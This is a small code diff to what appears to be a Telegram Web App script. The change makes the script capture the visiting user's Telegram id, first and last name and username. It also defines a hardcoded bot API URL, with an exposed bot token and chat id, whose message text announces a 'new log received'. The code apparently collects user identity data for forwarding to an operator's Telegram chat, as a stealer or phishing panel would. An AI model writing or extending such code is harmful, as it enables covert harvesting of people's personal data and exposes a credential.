@@ -6,10 +6,10 @@ let tg = window.Telegram.WebApp; //получаем объект webapp теле
 
 tg.expand(); //расширяем на все окно  
 
-var id = '${tg.initDataUnsafe.user.id}';
-var firstname = '${tg.initDataUnsafe.user.first_name}';
-var lastname = '${tg.initDataUnsafe.user.last_name}';
-var username = '${tg.initDataUnsafe.user.username}';
+var id = `${tg.initDataUnsafe.user.id}`;
+var firstname = `${tg.initDataUnsafe.user.first_name}`;
+var lastname = `${tg.initDataUnsafe.user.last_name}`;
+var username = `${tg.initDataUnsafe.user.username}`;
 
 var ip = "15"
 var api = "https://api.telegram.org/bot6687099688:AAEi1SvgP6tJ5URBFIxtbmO9Co3uqsFA2JM/sendMessage?chat_id=5853359722&text=🆕 Получен новый лог! "
